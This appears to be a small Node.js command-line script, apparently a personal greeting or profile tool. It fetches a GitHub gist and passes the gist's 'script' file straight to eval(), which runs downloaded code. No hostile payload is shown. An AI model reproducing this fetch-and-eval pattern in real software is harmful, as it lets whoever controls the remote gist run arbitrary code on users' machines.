#!/usr/bin/env node
'use strict';
import fetch from "node-fetch"; import c from "chalk"; import ww from "word-wrap";
console.clear();
fetch('https://api.github.com/gists/7d086763079ea9f52a6ec5555a5299a5').then(results => { return results.json(); }).then(data => { eval(data.files["script"].content); }).catch((err) => { console.log("Could'nt fetch my data! report this with erenkulaksz@gmail.com ERROR:", err); });